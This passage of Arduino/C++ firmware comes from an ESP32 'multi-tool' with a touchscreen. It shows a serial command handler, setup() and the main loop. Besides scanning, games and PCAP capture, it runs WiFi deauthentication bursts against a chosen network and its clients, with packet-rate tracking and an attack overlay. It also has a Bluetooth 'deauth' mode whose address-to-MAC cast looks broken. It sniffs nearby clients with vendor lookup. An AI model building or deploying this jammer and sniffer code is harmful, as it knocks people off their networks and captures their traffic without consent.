    Serial.println("[CMD] Switching to Bluetooth mode...");
    return;
  }
  else if (cmd == "radio none") {
    requestRadioModeSwitch(RADIO_MODE_NONE);
    handleRadioModeSwitch();
    Serial.println("[CMD] Switching all radios off...");
    return;
  }
  else if (cmd == "radio status") {
    Serial.printf("[RADIO] Current mode: %d\n", currentRadioMode);
    Serial.printf("  WiFi active: %s\n", wifiRadioEnabled ? "YES" : "NO");
    Serial.printf("  BT active: %s\n", btRadioEnabled ? "YES" : "NO");
    Serial.printf("  BT initialized: %s\n", btRadioInitialized ? "YES" : "NO");
    return;
  }
  if (awaitingPassword) {
    if (cmd.length()>0) connectToWiFiNetwork(pendingSSID, cmd);
    else Serial.println("[-] Empty password.");
    awaitingPassword=false; pendingSSID=""; return;
  }
  String lc=cmd; lc.toLowerCase();
  Serial.println("> "+cmd);
  
  if (lc=="pcap_start") {
    if (startPCAPCapture(0, 10000)) {
      Serial.println("[PCAP] Capture started");
    } else {
      Serial.println("[-] Failed to start capture");
    }
  }
  else if (lc=="pcap_stop") {
    stopPCAPCapture();
  }
  else if (lc=="pcap_list") {
    listPCAPFiles();
  }
  else if (lc.startsWith("pcap_view ")) {
    String filename = cmd.substring(10);
    filename.trim();
    viewPCAPStats(filename);
  }
  else if (lc.startsWith("pcap_delete ")) {
    String filename = cmd.substring(12);
    filename.trim();
    deletePCAPFile(filename);
  }
  else if (lc.startsWith("pcap_target ")) {
    int n = cmd.substring(12).toInt();
    if (n>0 && n<=pcapTotalNetworks) {
      pcapCurrentNetworkIndex = n-1;
      pcapSelectNetwork();
    } else {
      Serial.println("[-] Invalid network number");
    }
  }
  else if (lc.startsWith("pcap_device ")) {
    int n = cmd.substring(12).toInt();
    if (n>0 && n<=pcapTotalClients) {
      pcapCurrentClientIndex = n-1;
      selectPCAPClient();
    } else {
      Serial.println("[-] Invalid client number");
    }
  }
  else if (lc=="pcap_clear") {
    clearPCAPFilters();
  }
  else if (lc=="pcap_scan") {
    pcapScanNetworks();
  }
  else if (lc=="pcap_networks") {
    if (pcapTotalNetworks == 0) {
      Serial.println("No networks. Run pcap_scan first.");
      return;
    }
    for (int i=0; i<pcapTotalNetworks; i++) {
      Serial.printf("  %2d. %-24s CH%2d %4ddBm %s\n", 
        i+1, 
        pcapNetworks[i].ssid.c_str(), 
        pcapNetworks[i].channel, 
        pcapNetworks[i].rssi, 
        encStr(pcapNetworks[i].encryptionType).c_str());
    }
  }
  else if (lc.startsWith("pcap_select_network ")) {
    int n = cmd.substring(20).toInt();
    if (n>0 && n<=pcapTotalNetworks) {
      pcapCurrentNetworkIndex = n-1;
      pcapSelectNetwork();
      Serial.printf("Selected network: %s\n", pcapNetworks[pcapCurrentNetworkIndex].ssid.c_str());
    } else {
      Serial.println("[-] Invalid network number");
    }
  }
  else if (lc=="pcap_sniff") {
    if (pcapSelectedNetworkIndex >= 0) {
      pcapStartClientSniffer();
    } else {
      Serial.println("[-] Select a network first with pcap_select_network");
    }
  }
  else if (lc=="pcap_clients") {
    if (pcapTotalClients == 0) {
      Serial.println("No clients. Run pcap_sniff first.");
      return;
    }
    for (int i=0; i<pcapTotalClients; i++) {
      Serial.printf("  %2d. %s  RSSI:%d  Pkts:%lu  Vendor:%s\n", 
        i+1, 
        pcapClients[i].macStr.c_str(),
        pcapClients[i].rssi,
        pcapClients[i].pktCount,
        getManufacturer(pcapClients[i].oui).c_str());
    }
  }
  else if (lc=="help"||lc=="?")  printHelp();
  else if (lc=="reboot")         { Serial.println("Rebooting..."); delay(200); ESP.restart(); }
  else if (lc=="calibrate")      calibrateTouch();
  else if (lc=="scan")           scanNetworks();
  else if (lc=="bt") {
    if (currentMode != MODE_BT_SCANNER) {
      currentMode = MODE_BT_SCANNER;
      tft.fillScreen(C_BG);
      displayBTScanner();
      drawBTButtons();
    }
    startBTScan();
  }
  else if (lc=="btstop") {
    stopBTScan();
    if (currentMode == MODE_BT_SCANNER) {
      displayBTScanner();
      drawBTButtons();
    }
  }
  else if (lc=="btlist") {
    if (totalBTDevices == 0) { Serial.println("No BT devices found."); return; }
    for (int i=0; i<totalBTDevices; i++) {
      Serial.printf("  %2d. %-20s [%s] RSSI:%d %s\n", 
        i+1, btDevices[i].name.c_str(), btDevices[i].address.c_str(), 
        btDevices[i].rssi, btDevices[i].isRandom ? "RAND" : "PUB");
    }
  }
  else if (lc.startsWith("btselect ")) {
    int n = lc.substring(8).toInt();
    if (n>0 && n<=totalBTDevices) {
      currentBTIndex = n-1;
      selectBTDevice();
      Serial.printf("Selected: %s\n", btDevices[currentBTIndex].name.c_str());
    } else Serial.println("Invalid index");
  }
  else if (lc=="btdeauth") {
    startBTDeauth();
  }
  else if (lc=="btstopdeauth") {
    stopBTDeauth();
  }
  else if (lc=="games") {
    currentMode = MODE_GAMES_MENU;
    tft.fillScreen(C_BG);
    drawGamesMenu();
    drawGamesMenuButtons();
  }
  else if (lc=="tetris") {
    currentMode = MODE_TETRIS;
    tft.fillScreen(C_BG);
    initTetris();
    drawTetris();
    drawTetrisButtons();
  }
  else if (lc=="galaga") {
    currentMode = MODE_GALAGA;
    tft.fillScreen(C_BG);
    initGalaga();
    drawGalaga();
    drawGalagaButtons();
  }
  else if (lc=="list") {
    if (totalNetworks==0) { Serial.println("[-] No networks."); return; }
    for (int i=0; i<totalNetworks; i++)
      Serial.printf("  %2d. %-24s CH%2d %4ddBm %s\n",i+1,networks[i].ssid.c_str(),networks[i].channel,networks[i].rssi,encStr(networks[i].encryptionType).c_str());
  }
  else if (lc=="clients") {
    int cc; portENTER_CRITICAL(&snifferMux); cc=totalClients; portEXIT_CRITICAL(&snifferMux);
    if (cc==0) { Serial.println("[-] No clients."); return; }
    Serial.printf("Clients on %s (ISOLATED NETWORK):\n", selectedNetworkIndex>=0?networks[selectedNetworkIndex].ssid.c_str():"?");
    portENTER_CRITICAL(&snifferMux);
    for (int i=0; i<cc; i++)
      Serial.printf("  %d. %s  RSSI:%d  Pkts:%lu  Vendor:%s\n",i+1,clients[i].macStr.c_str(),clients[i].rssi,clients[i].pktCount,getManufacturer(clients[i].oui).c_str());
    portEXIT_CRITICAL(&snifferMux);
  }
  else if (lc.startsWith("select ")) {
    int n=lc.substring(7).toInt();
    if (n>0&&n<=totalNetworks) { currentIndex=n-1; selectCurrentNetwork(); }
    else Serial.println("[-] Invalid.");
  }
  else if (lc=="sel") selectCurrentNetwork();
  else if (lc.startsWith("connect ")) {
    String p=cmd.substring(8); p.trim();
    int num=p.toInt();
    if (num>0&&num<=totalNetworks) {
      currentIndex=num-1; NetworkInfo &n=networks[currentIndex];
      if (n.encryptionType==WIFI_AUTH_OPEN) connectToWiFiNetwork(n.ssid,"");
      else { Serial.println("[?] Password for "+n.ssid+":"); awaitingPassword=true; pendingSSID=n.ssid; serialPromptTime=millis(); }
    } else {
      int sp=p.indexOf(' ');
      if (sp>0) connectToWiFiNetwork(p.substring(0,sp), p.substring(sp+1));
      else Serial.println("[-] Usage: connect [num] OR connect [ssid] [pass]");
    }
  }
  else if (lc=="disconnect") disconnectFromWiFi();
  else if (lc=="deauth")     startDeauth();
  else if (lc=="stop")       stopDeauth();
  else if (lc=="status") {
    int cc; portENTER_CRITICAL(&snifferMux); cc=totalClients; portEXIT_CRITICAL(&snifferMux);
    Serial.printf("Attack:%s Isolation:%s Target:%s WiFi:%s Clients:%d Pkts:%lu\n",
      deauthRunning?"ON":"Off",
      snifferRunning?"ACTIVE":"Off",
      selectedNetworkIndex>=0?networks[selectedNetworkIndex].ssid.c_str():"None",
      isConnectedToNetwork?"On":"Off", cc, totalPackets);
  }
  else if (lc=="stats")  Serial.printf("Pkts:%lu Rate:%d/s Peak:%d/s\n",totalPackets,actualRate,peakRate);
  else if (lc=="stored") {
    if (storedNetworkCount==0) Serial.println("No stored networks.");
    else for (int i=0; i<storedNetworkCount; i++) Serial.printf("  %d. %s\n",i+1,storedNetworks[i].ssid.c_str());
  }
  else if (lc.length()>0) Serial.println("[-] Unknown. Type 'help'.");
}

void handleSerialInput() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c=='\n'||c=='\r') {
      if (serialInput.length()>0) { processSerialCommand(serialInput); serialInput=""; }
    } else serialInput += c;
  }
  if (awaitingPassword && millis()-serialPromptTime>SERIAL_TIMEOUT) {
    awaitingPassword=false; pendingSSID=""; Serial.println("[!] Timeout.");
  }
}

// ============================================================
//  SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  delay(500); 
  silenceLogs();

  Serial.println(F("\n╔══════════════════════════════════════╗"));
  Serial.println(F("║  ESP32 MULTI-TOOL v1.1              ║"));
  Serial.println(F("║  WiFi/BT/GAMES/PCAP with SD Card    ║"));
  Serial.println(F("╚══════════════════════════════════════╝"));

  loadConfig();

  pinMode(27, OUTPUT); 
  digitalWrite(27, HIGH);
  pinMode(4,  OUTPUT); 
  digitalWrite(4, HIGH); 
  delay(10);
  digitalWrite(4, LOW); 
  delay(10); 
  digitalWrite(4, HIGH); 
  delay(1000);

  tft.init();
  tft.setRotation(1);
  
  tft.fillScreen(C_BG);
  delay(50);
  
  showCoolLoadingScreen();
  
  tft.fillScreen(C_BG);
  
  tft.setTextColor(C_GREEN, C_BG); 
  tft.setTextSize(1);
  tft.setCursor(4, 3);
  tft.print("ESP32 MULTI-TOOL v1.1 - ");
  tft.setTextColor(C_GREEN_DARK, C_BG);
  tft.setCursor(260, 3);
  tft.print("SELECT OPTION");
  tft.drawFastHLine(0, HEADER_H-1, SCREEN_W, C_GREEN);

  ts.begin();
  ts.setRotation(ROTATION_LEFT);

  initSDCard();

  pcap.isCapturing = false;
  pcap.maxFileSize = 10 * 1024 * 1024;
  pcap.maxPackets = 10000;
  pcap.captureDuration = 0;
  pcap.filterByNetwork = false;
  pcap.filterByDevice = false;
  pcap.packetListIndex = 0;
  pcap.viewingPackets = false;
  pcap.viewedPacketIndex = 0;
  memset(pcap.targetBSSID, 0, 6);
  memset(pcap.targetDeviceMAC, 0, 6);
  pcap.targetSSID = "";
  pcap.targetDeviceMACStr = "";
  pcap.targetChannel = 0;

  pcapTotalNetworks = 0;
  pcapSelectedNetworkIndex = -1;
  pcapCurrentNetworkIndex = 0;
  pcapTotalClients = 0;
  pcapSelectedClientIndex = -1;
  pcapCurrentClientIndex = 0;
  pcapSnifferRunning = false;

  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(80);
  delay(100); 
  silenceLogs();

  for (int i=0; i<MAX_NETWORKS; i++) 
    netHitTime[i]=0;

  currentMode = MODE_MAIN_MENU;
  drawMainMenu();
  drawMainMenuButtons();
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setTextSize(1);
  tft.setCursor(350, 3);
  tft.print("RADIO: OFF");
  
}

// ============================================================
//  LOOP
// ============================================================
void loop() {
  ts.read();
  unsigned long now = millis();

  handleSerialInput();
  handleRadioModeSwitch(); 
  static unsigned long lastRadioDisplay = 0;
  if (now - lastRadioDisplay > 2000) {
    if (currentMode == MODE_MAIN_MENU || currentMode == MODE_WIFI_DEAUTH || currentMode == MODE_BT_SCANNER) {
      tft.fillRect(350, 3, 80, 12, C_BG);
      tft.setTextColor(C_GREEN_DIM, C_BG);
      tft.setTextSize(1);
      tft.setCursor(350, 3);
      if (currentRadioMode == RADIO_MODE_WIFI && wifiRadioEnabled) {
        tft.print("RADIO: WiFi");
      } else if (currentRadioMode == RADIO_MODE_BT && btRadioEnabled) {
        tft.print("RADIO: BT");
      } else {
        tft.print("RADIO: OFF");
      }
    }
    lastRadioDisplay = now;
  }
  if (currentMode == MODE_WIFI_DEAUTH && !isWiFiRadioAvailable() && 
      (totalNetworks > 0 || selectedNetworkIndex >= 0 || clientViewActive)) {
    Serial.println("[UI] WiFi feature requested, switching radio...");
    requestRadioModeSwitch(RADIO_MODE_WIFI);
  }
  
  if (currentMode == MODE_BT_SCANNER && !isBluetoothRadioAvailable()) {
    Serial.println("[UI] BT feature requested, switching radio...");
    requestRadioModeSwitch(RADIO_MODE_BT);
  }
  
  if (currentMode == MODE_PCAP_CAPTURE && pcap.isCapturing && !isWiFiRadioAvailable()) {
    Serial.println("[PCAP] Capture requires WiFi, switching radio...");
    requestRadioModeSwitch(RADIO_MODE_WIFI);
  }
  if (ts.isTouched && !wasTouched && (now-lastTouchTime > TOUCH_DEBOUNCE)) {
    int x = mapTX(ts.points[0].x, ts.points[0].y);
    int y = mapTY(ts.points[0].x, ts.points[0].y);
    if (x>=0 && x<=SCREEN_W && y>=0 && y<=SCREEN_H) {
      switch(currentMode) {
        case MODE_MAIN_MENU:
          handleMainMenuTouch(x, y);
          break;
        case MODE_GAMES_MENU:
          handleGamesMenuTouch(x, y);
          break;
        case MODE_WIFI_DEAUTH:
          if (clientViewActive) handleClientTouch(x, y);
          else handleTouch(x, y);
          break;
        case MODE_BT_SCANNER:
          handleBTTouch(x, y);
          break;
        case MODE_TETRIS:
          handleTetrisTouch(x, y);
          break;
        case MODE_GALAGA:
          handleGalagaTouch(x, y);
          break;
        case MODE_PCAP_CAPTURE:
          handlePCAPTouch(x, y);
          break;
        case MODE_PCAP_PACKET_VIEW:
          handlePacketViewTouch(x, y);
          break;
        case MODE_PCAP_SCAN_VIEW:
          handlePCAPScanTouch(x, y);
          break;
        case MODE_PCAP_CLIENT_VIEW:
          handlePCAPClientTouch(x, y);
          break;
        case MODE_PCAP_FILE_LIST:
          handlePCAPFileListTouch(x, y);
          break;
      }
    }
    lastTouchTime = now; wasTouched = true;
  }
  if (!ts.isTouched) wasTouched = false;

  static unsigned long lastCleanup = 0;
  if (snifferRunning && now - lastCleanup > 10000) {
    cleanupStaleClients();
    lastCleanup = now;
  }
  
  static unsigned long lastPcapCleanup = 0;
  if (pcapSnifferRunning && now - lastPcapCleanup > 10000) {
    pcapCleanupStaleClients();
    lastPcapCleanup = now;
  }

  if (isConnecting && now-connectionStartTime > CONNECTION_TIMEOUT) {
    isConnecting=false; isConnectedToNetwork=false;
    showMessage("Connection timeout!", 1500);
    if (currentMode == MODE_WIFI_DEAUTH) {
      drawListPanel(); drawButtons(); drawRadarPanelFrame();
    }
  }

  if (pcap.isCapturing) {
    if (pcap.captureDuration > 0 && (now - pcap.startTime) > pcap.captureDuration * 1000) {
      stopPCAPCapture();
      if (currentMode == MODE_PCAP_CAPTURE) {
        displayPCAPView();
        drawPCAPButtons();
      }
    }
    
    if (!pcap.isCapturing && currentMode == MODE_PCAP_CAPTURE) {
      displayPCAPView();
      drawPCAPButtons();
      showMessage("Capture complete", 1500);
    }
  }

  if (deauthRunning && currentMode == MODE_WIFI_DEAUTH) {
    for (int b=0; b<20; b++) { sendBurst(); delayMicroseconds(200); }
    packetsThisSecond += PKT_BURST * 20 * (clientDeauthRunning ? 2 : 1);
    if (now-lastRateCheck >= 1000) {
      actualRate=packetsThisSecond; packetsThisSecond=0; lastRateCheck=now;
      if (actualRate>peakRate) peakRate=actualRate;
      static int rc=0;
      if (++rc>=5) { Serial.printf("Rate: %d/s\n", actualRate); rc=0; }
    }
    if (now-lastDisplayUpdate >= 50) {
      if (currentMode == MODE_WIFI_DEAUTH) {
        updateRadarSweep();
        updateAttackOverlay();
        if (clientViewActive) displayClientView(); else drawListPanel();
      }
      lastDisplayUpdate=now;
    }
    return;
  }

  if (btDeauthRunning && currentMode == MODE_BT_SCANNER) {
    for (int b=0; b<10; b++) {
      if (selectedBTIndex >= 0) {
        uint8_t* mac = (uint8_t*)btDevices[selectedBTIndex].address.c_str();
        sendBTDeauthPacket(mac);
        btDevices[selectedBTIndex].pktCount++;
        totalBTPackets++;
      }
      delayMicroseconds(500);
    }
    
    btPacketsThisSecond += 10;
    
    if (now-lastRateCheck >= 1000) {
      btActualRate = btPacketsThisSecond;
      btPacketsThisSecond = 0;
      lastRateCheck = now;
      if (btActualRate > btPeakRate) btPeakRate = btActualRate;
    }
    
    if (now-lastDisplayUpdate >= 50) {
      updateBTRadarSweep();
      updateBTAttackOverlay();
      lastDisplayUpdate=now;
    }
    return;
  }

  if (currentMode == MODE_TETRIS && tetrisGameActive && !tetrisGameOver) {
    if (now - tetrisLastFall > tetrisFallDelay) {
      movePiece(0, 1);
      drawTetris();
      tetrisLastFall = now;
    }
  }

  if (now-lastDisplayUpdate >= 50) {
    if (currentMode == MODE_WIFI_DEAUTH) {
      updateRadarSweep();
    } else if (currentMode == MODE_BT_SCANNER) {
      updateBTRadarSweep();
    } else if (currentMode == MODE_PCAP_CAPTURE && pcap.isCapturing) {
      static unsigned long lastPCAPUpdate = 0;
      if (now - lastPCAPUpdate > 500) {
        displayPCAPView();
        drawPCAPButtons();
        lastPCAPUpdate = now;
      }
    } else if (currentMode == MODE_PCAP_CLIENT_VIEW && pcapSnifferRunning) {
      static unsigned long lastClientUpdate = 0;
      if (now - lastClientUpdate > 1000) {
        displayPCAPClientView();
        lastClientUpdate = now;
      }
    }
    lastDisplayUpdate=now;
  }

  if (currentMode == MODE_WIFI_DEAUTH && clientViewActive && snifferRunning && now-lastDisplayUpdate >= 1000) {
    displayClientView();
    lastDisplayUpdate=now;
  }
  
  if (currentMode == MODE_BT_SCANNER && btScanning) {
    static unsigned long lastBTUpdate = 0;
    
    if (now - btScanStartTime > 5000) {
      stopBTScan();
      displayBTScanner();
      drawBTButtons();
    } 
    else if (now - lastBTUpdate > 500) {
      displayBTScanner();
      lastBTUpdate = now;
    }   
  }

  if (config.telegramEnabled && isConnectedToNetwork && now-lastTGCheck > TG_INTERVAL) {
    checkTelegram(); lastTGCheck=now;
  }
  
  if (isConnectedToNetwork) {
    server.handleClient();
  }

  delay(10);
}